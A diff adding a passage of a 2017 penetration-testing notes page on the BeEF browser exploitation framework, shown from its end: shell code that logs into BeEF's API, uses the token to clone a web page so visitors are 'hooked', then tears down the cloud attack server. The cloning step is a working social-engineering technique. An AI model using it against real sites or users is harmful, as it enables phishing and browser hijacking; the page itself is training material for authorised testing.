+            <span class="nv">$HTTP</span>://<span class="nv">$BEEF_IPP</span>/api/admin/login<span class="k">)</span>
+<span class="nv">SUCCESS</span><span class="o">=</span><span class="si">${</span><span class="nv">RESPONSE</span><span class="p">#*</span><span class="se">\&quot;</span><span class="nv">success</span><span class="se">\&quot;</span><span class="p">:</span><span class="si">}</span>
+<span class="nv">SUCCESS</span><span class="o">=</span><span class="si">${</span><span class="nv">SUCCESS</span><span class="p">%%,*</span><span class="si">}</span>
+<span class="nb">echo</span> <span class="nv">SUCCESS</span><span class="o">=</span><span class="nv">$SUCCESS</span>
+<span class="nv">TOKEN</span><span class="o">=</span><span class="si">${</span><span class="nv">RESPONSE</span><span class="p">#*</span><span class="se">\&quot;</span><span class="nv">token</span><span class="se">\&quot;</span><span class="p">:</span><span class="se">\&quot;</span><span class="si">}</span>
+<span class="nv">TOKEN</span><span class="o">=</span><span class="si">${</span><span class="nv">TOKEN</span><span class="p">%%</span><span class="se">\&quot;</span><span class="p">*</span><span class="si">}</span>
+<span class="nb">echo</span> <span class="nv">TOKEN</span><span class="o">=</span><span class="nv">$TOKEN</span>
+
+<span class="c1"># clone_page using the TOKEN</span>
+curl --insecure --header <span class="s2">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>  <span class="se">\</span>
+     --data <span class="s1">&#39;{&quot;url&quot;:&quot;&#39;</span><span class="nv">$CLONEME</span><span class="s1">&#39;&quot;, &quot;mount&quot;:&quot;/html/index.html&quot;}&#39;</span> <span class="se">\</span>
+     --request POST <span class="nv">$HTTP</span>://<span class="nv">$BEEF_IPP</span>/api/seng/clone_page?token<span class="o">=</span><span class="nv">$TOKEN</span>
+
+<span class="c1"># Now can fetch cloned page and get hooked:</span>
+<span class="c1"># curl --insecure $HTTP://$FQDN/html/index.html | grep hook</span>
+</pre></div>
+</div>
+</div>
+<div class="section" id="server-delete">
+<h3>6.2.5.4. Server delete<a class="headerlink" href="#server-delete" title="Permalink to this headline">¶</a></h3>
+<p>If you’re done now first logon/logoff the GCE instance to shut down BeEF and the server:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># On the attacker machine</span>
+<span class="nv">PROJECT</span><span class="o">=</span><span class="s2">&quot;bitbender.org:bitbender&quot;</span>
+<span class="nv">ZONE</span><span class="o">=</span><span class="s2">&quot;us-central1-c&quot;</span>
+<span class="nv">INSTANCE</span><span class="o">=</span><span class="s2">&quot;pentest-meetup&quot;</span>
+<span class="nv">DOMAIN</span><span class="o">=</span><span class="s2">&quot;gce.bitbender.org&quot;</span>
+<span class="nv">FQDN</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$INSTANCE</span><span class="s2">.</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span>
+<span class="nv">VMUSER</span><span class="o">=</span>hacker
+<span class="nv">EMAIL</span><span class="o">=</span><span class="s2">&quot;hacker@</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span>
+<span class="nv">SSH_PRIV_FILE</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$HOME</span><span class="s2">/.ssh/id_rsa_gce&quot;</span>
+ssh-add <span class="nv">$SSH_PRIV_FILE</span>
+ssh <span class="nv">$VMUSER</span>@<span class="nv">$EXT_IP</span>
+
+<span class="c1"># on the GCE BeEF instance</span>
+<span class="nb">cd</span>
+<span class="nb">cd</span> beef
+<span class="nb">kill</span> -INT <span class="k">$(</span>ps -C ruby -o <span class="nv">pid</span><span class="o">=</span><span class="k">)</span>
+<span class="nv">SUDO</span><span class="o">=</span><span class="s2">&quot;</span><span class="k">$(</span>which sudo<span class="k">)</span><span class="s2">&quot;</span>
+<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+<span class="nv">$SUDO</span> date
+<span class="nv">$SUDO</span> shutdown -h now
+
+<span class="c1"># On the attacker machine</span>
+<span class="c1">#   it takes a little while for the instance to reach TERMINATED status</span>
+gcloud compute instances list
+<span class="c1"># If you&#39;re done with the instance:</span>
+gcloud compute instances delete <span class="nv">$INSTANCE</span> --quiet
+gcloud compute instances list
+<span class="c1"># And remove the added firewall-rules</span>
+gcloud compute firewall-rules delete beef-local --quiet
+gcloud compute firewall-rules delete beef-external --quiet
+</pre></div>
+</div>
+<p>Don’t forget to clean up DNS or your <code class="file docutils literal"><span class="pre">/etc/hosts</span></code> file.</p>
+</div>
+</div>
+</div>
+
+
+           </div>
+           <div class="articleComments">
+            
+           </div>
+          </div>
+          <footer>
+  
+    <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
+      
+        <a href="burp_suite.html" class="btn btn-neutral float-right" title="6.3. Burp Suite and ZAP" accesskey="n" rel="next">Next <span class="fa fa-arrow-circle-right"></span></a>
+      
+      
+        <a href="aircrack-ng.html" class="btn btn-neutral" title="6.1. aircrack-ng" accesskey="p" rel="prev"><span class="fa fa-arrow-circle-left"></span> Previous</a>
+      
+    </div>
+  
+
+  <hr/>
+
+  <div role="contentinfo">
+    <p>
+        &copy; Copyright 2017, bitbender.
+
+    </p>
+  </div>
+  Built with <a href="http://sphinx-doc.org/">Sphinx</a> using a <a href="https://github.com/snide/sphinx_rtd_theme">theme</a> provided by <a href="https://readthedocs.org">Read the Docs</a>. 
+
+</footer>
+
+        </div>
+      </div>
+
+    </section>
+
+  </div>
+  
+
+
+  
+
+    <script type="text/javascript">
+        var DOCUMENTATION_OPTIONS = {
+            URL_ROOT:'../',
+            VERSION:'1.0.2',
+            COLLAPSE_INDEX:false,
+            FILE_SUFFIX:'.html',
+            HAS_SOURCE:  true,
+            SOURCELINK_SUFFIX: '.txt'
+        };
+    </script>
+      <script type="text/javascript" src="../_static/jquery.js"></script>
+      <script type="text/javascript" src="../_static/underscore.js"></script>
+      <script type="text/javascript" src="../_static/doctools.js"></script>
+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.0/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  
+  
+    <script type="text/javascript" src="../_static/js/theme.js"></script>
+  
+
+  
+  
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.StickyNav.enable();
+      });
+  </script>
+   
+
+</body>
+</html>
